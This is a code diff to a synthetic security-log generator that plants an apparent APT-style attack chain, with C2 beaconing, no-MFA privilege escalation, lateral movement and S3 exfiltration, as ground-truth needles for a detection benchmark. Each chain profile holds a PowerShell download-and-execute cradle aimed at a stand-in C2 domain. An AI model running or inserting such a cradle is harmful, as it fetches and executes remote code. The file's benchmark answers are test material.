@@ -92,30 +92,62 @@ PORT_WEIGHTS = [0.30, 0.34, 0.04, 0.08, 0.05, 0.04, 0.03, 0.02, 0.02, 0.04, 0.02
 # machines appear as hostname (EDR), IP (NDR), and instance-id (cloud).         #
 # --------------------------------------------------------------------------- #
 
-ACTOR = {
-    "human": "h_jdoe",
-    "sid": "S-1-5-21-3623811015-3361044348-30300820-1107",
-    "account": "ACME\\jdoe",
-    "upn": "jdoe@acme.example",
-    "iam_principal": "arn:aws:iam::123456789012:user/jdoe",
-    "assumed_role": "arn:aws:sts::123456789012:assumed-role/AdminRole/jdoe-session",
+# Two interchangeable chain profiles, so the frozen query battery can score a second, independent
+# instantiation. Chain A is the original APT29-style chain (RDP lateral) with its exact values, so it
+# reproduces the published result; chain B is a different actor on a different subnet with different
+# indicators and an SMB lateral leg (T1021 still, different port). The six query-relevant signatures —
+# beacon, encoded-PowerShell, no-MFA priv-esc, lateral, first-seen domain, identity pivot — are present
+# in both so the SAME A1–A10 battery applies; only the indicators differ.
+CHAINS = {
+    "A": {
+        "name": "A — APT29-style, RDP lateral (T1021.001)",
+        "actor": {"human": "h_jdoe", "sid": "S-1-5-21-3623811015-3361044348-30300820-1107",
+                  "account": "ACME\\jdoe", "upn": "jdoe@acme.example",
+                  "iam_principal": "arn:aws:iam::123456789012:user/jdoe",
+                  "assumed_role": "arn:aws:sts::123456789012:assumed-role/AdminRole/jdoe-session"},
+        "ws1": {"hostname": "WS1", "ip": "10.10.1.21", "instance_id": "i-0a1b2c3d4e5f6071"},
+        "ws2": {"hostname": "WS2", "ip": "10.10.1.22", "instance_id": "i-0e4f5a6b7c8d9012"},
+        "c2_domain": "cdn-telemetry-sync.net", "c2_ip": "203.0.113.66", "cloud_src_ip": "203.0.113.7",
+        "sensitive_bucket": "acme-financials-prod",
+        "ps_plaintext": "IEX (New-Object Net.WebClient).DownloadString('https://cdn-telemetry-sync.net/s')",
+        "beacon_port": 443, "lateral_port": 3389,
+    },
+    "B": {
+        "name": "B — different actor/subnet, SMB lateral (T1021.002)",
+        "actor": {"human": "h_bcarter", "sid": "S-1-5-21-9988776655-1122334455-66778899-2207",
+                  "account": "GLOBEX\\bcarter", "upn": "bcarter@globex.example",
+                  "iam_principal": "arn:aws:iam::987654321098:user/bcarter",
+                  "assumed_role": "arn:aws:sts::987654321098:assumed-role/PowerUser/bcarter-session"},
+        "ws1": {"hostname": "SRV1", "ip": "10.30.7.51", "instance_id": "i-0b2c3d4e5f607182"},
+        "ws2": {"hostname": "SRV2", "ip": "10.30.7.52", "instance_id": "i-0b6c7d8e9f012345"},
+        "c2_domain": "metrics-collector-edge.io", "c2_ip": "198.51.100.77", "cloud_src_ip": "198.51.100.9",
+        "sensitive_bucket": "globex-trading-secrets",
+        "ps_plaintext": "IEX (New-Object Net.WebClient).DownloadString('https://metrics-collector-edge.io/x')",
+        "beacon_port": 8443, "lateral_port": 445,
+    },
 }
 
-WS1 = {"hostname": "WS1", "ip": "10.10.1.21", "instance_id": "i-0a1b2c3d4e5f6071"}
-WS2 = {"hostname": "WS2", "ip": "10.10.1.22", "instance_id": "i-0e4f5a6b7c8d9012"}
+ACTIVE_CHAIN = "A"
+ACTOR = WS1 = WS2 = None
+C2_DOMAIN = C2_IP = CLOUD_SRC_IP = SENSITIVE_BUCKET = _PS_PLAINTEXT = PS_ENCODED = None
+BEACON_PORT = LATERAL_PORT = None
 
-C2_DOMAIN = "cdn-telemetry-sync.net"
-C2_IP = "203.0.113.66"
-SENSITIVE_BUCKET = "acme-financials-prod"
 
-# The exact PowerShell payload A2 must recover verbatim (grain-loss: detail-gone
-# under coarse normalization, retained at atomic grain).
-_PS_PLAINTEXT = (
-    "IEX (New-Object Net.WebClient).DownloadString('https://"
-    + C2_DOMAIN
-    + "/s')"
-)
-PS_ENCODED = base64.b64encode(_PS_PLAINTEXT.encode("utf-16-le")).decode("ascii")
+def apply_chain(name):
+    """Bind the chain-IOC module globals from a profile. Chain A = the original exact values."""
+    global ACTIVE_CHAIN, ACTOR, WS1, WS2, C2_DOMAIN, C2_IP, CLOUD_SRC_IP, SENSITIVE_BUCKET
+    global _PS_PLAINTEXT, PS_ENCODED, BEACON_PORT, LATERAL_PORT
+    c = CHAINS[name]
+    ACTIVE_CHAIN = name
+    ACTOR, WS1, WS2 = c["actor"], c["ws1"], c["ws2"]
+    C2_DOMAIN, C2_IP, CLOUD_SRC_IP = c["c2_domain"], c["c2_ip"], c["cloud_src_ip"]
+    SENSITIVE_BUCKET = c["sensitive_bucket"]
+    _PS_PLAINTEXT = c["ps_plaintext"]
+    PS_ENCODED = base64.b64encode(_PS_PLAINTEXT.encode("utf-16-le")).decode("ascii")
+    BEACON_PORT, LATERAL_PORT = c["beacon_port"], c["lateral_port"]
+
+
+apply_chain("A")
 
 SCALES = {
     "full": dict(users=300, days=14, auth_per_user_day=6, n_hosts=80,
@@ -297,7 +329,7 @@ def plant_chain(cfg):
     n0 = {"_src": "cloudtrail", "_uid": "api-needle-0", "_needle_id": "stage0_oauth",
           "_event_time_ms": at(0), "_ingest_time_ms": at(12),
           "event_source": "sts.amazonaws.com", "event_name": "GetSessionToken",
-          "principal": ACTOR["iam_principal"], "src_ip": "203.0.113.7",
+          "principal": ACTOR["iam_principal"], "src_ip": CLOUD_SRC_IP,
           "mfaAuthenticated": False, "aws_region": "us-east-1"}
     streams["cloudtrail"].append(n0)
 
@@ -330,7 +362,7 @@ def plant_chain(cfg):
             "_src": "zeek_conn", "_uid": uid, "_needle_id": "stage2_beacon",
             "_event_time_ms": at(off), "_ingest_time_ms": at(off + 2),
             "orig_h": WS1["ip"], "orig_host": WS1["hostname"], "resp_h": C2_IP,
-            "resp_p": 443, "proto": "tcp",
+            "resp_p": BEACON_PORT, "proto": "tcp",
             "orig_bytes": rng.randint(180, 520), "resp_bytes": rng.randint(180, 640),
             "duration": round(rng.uniform(0.2, 1.5), 3)})
         beacon_uids.append(uid)
@@ -359,7 +391,7 @@ def plant_chain(cfg):
     n3_conn = {"_src": "zeek_conn", "_uid": "conn-needle-lateral", "_needle_id": "stage3_lateral_conn",
                "_event_time_ms": at(4205), "_ingest_time_ms": at(4207),
                "orig_h": WS1["ip"], "orig_host": WS1["hostname"], "resp_h": WS2["ip"],
-               "resp_p": 3389, "proto": "tcp", "orig_bytes": 12_400, "resp_bytes": 88_200,
+               "resp_p": LATERAL_PORT, "proto": "tcp", "orig_bytes": 12_400, "resp_bytes": 88_200,
                "duration": 410.2}
     streams["zeek_conn"].append(n3_conn)
     truth_needles["lateral_auth_uid"] = n3_auth["_uid"]
@@ -370,7 +402,7 @@ def plant_chain(cfg):
     n4 = {"_src": "cloudtrail", "_uid": "api-needle-nomfa", "_needle_id": "stage4_nomfa",
           "_event_time_ms": at(4800), "_ingest_time_ms": at(4815),
           "event_source": "iam.amazonaws.com", "event_name": "AttachUserPolicy",
-          "principal": ACTOR["iam_principal"], "src_ip": "203.0.113.7",
+          "principal": ACTOR["iam_principal"], "src_ip": CLOUD_SRC_IP,
           "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess",
           "aws_region": "us-east-1"}
     # deliberately NO "mfaAuthenticated" key
@@ -383,7 +415,7 @@ def plant_chain(cfg):
     n5 = {"_src": "cloudtrail", "_uid": "api-needle-assumerole", "_needle_id": "stage5_assumerole",
           "_event_time_ms": at(5400), "_ingest_time_ms": at(5412),
           "event_source": "sts.amazonaws.com", "event_name": "AssumeRole",
-          "principal": ACTOR["assumed_role"], "src_ip": "203.0.113.7",
+          "principal": ACTOR["assumed_role"], "src_ip": CLOUD_SRC_IP,
           "mfaAuthenticated": False, "aws_region": "us-east-1"}
     streams["cloudtrail"].append(n5)
 
@@ -396,7 +428,7 @@ def plant_chain(cfg):
             "_src": "cloudtrail", "_uid": uid, "_needle_id": "stage6_exfil",
             "_event_time_ms": at(off), "_ingest_time_ms": at(off + 10),
             "event_source": "s3.amazonaws.com", "event_name": "GetObject",
-            "principal": ACTOR["assumed_role"], "src_ip": "203.0.113.7",
+            "principal": ACTOR["assumed_role"], "src_ip": CLOUD_SRC_IP,
             "resource": f"arn:aws:s3:::{SENSITIVE_BUCKET}/q3/file_{k:03d}.xlsx",
             "mfaAuthenticated": False, "aws_region": "us-east-1"})
         exfil_uids.append(uid)
@@ -441,6 +473,18 @@ def plant_chain(cfg):
         "truth_event_order": truth_event_order,
         "truth_identity_links": truth_identity_links,
         "truth_needles": truth_needles,
+        # IOC block: the indicators the query battery + stores need, so they read them from here
+        # rather than hardcoding chain-A values — what lets the frozen battery score either chain.
+        "ioc": {
+            "chain": ACTIVE_CHAIN, "chain_name": CHAINS[ACTIVE_CHAIN]["name"],
+            "ws1_host": WS1["hostname"], "ws1_ip": WS1["ip"], "ws1_instance": WS1["instance_id"],
+            "ws2_host": WS2["hostname"], "ws2_ip": WS2["ip"], "ws2_instance": WS2["instance_id"],
+            "c2_domain": C2_DOMAIN, "c2_ip": C2_IP, "cloud_src_ip": CLOUD_SRC_IP,
+            "iam_principal": ACTOR["iam_principal"], "assumed_role": ACTOR["assumed_role"],
+            "upn": ACTOR["upn"], "sid": ACTOR["sid"],
+            "beacon_port": BEACON_PORT, "lateral_port": LATERAL_PORT,
+            "sensitive_bucket": SENSITIVE_BUCKET,
+        },
     }
     return streams, ground_truth
 
@@ -550,7 +594,9 @@ def main():
     ap.add_argument("--scale", choices=list(SCALES), default="full")
     ap.add_argument("--no-write", action="store_true", help="determinism check only")
     ap.add_argument("--no-parquet", action="store_true", help="skip the Parquet convenience materialization")
+    ap.add_argument("--chain", choices=list(CHAINS), default="A", help="chain profile (A = original)")
     args = ap.parse_args()
+    apply_chain(args.chain)
     cfg = SCALES[args.scale]
 
     # Determinism guarantee: build twice, assert identical fingerprint, before writing.
